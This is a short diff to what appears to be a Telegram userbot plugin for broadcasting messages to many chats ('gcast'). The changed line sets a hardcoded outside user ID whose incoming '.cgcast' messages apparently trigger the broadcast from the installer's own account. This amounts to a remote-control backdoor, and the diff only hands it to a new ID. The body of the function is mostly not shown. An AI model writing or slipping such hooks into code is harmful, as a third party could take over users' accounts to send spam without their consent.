@@ -32,7 +32,7 @@ GCAST_BLACKLIST = [
 
 
 @jim_cmd(pattern="gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664,
+@register(incoming=True, from_users=2077846555,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
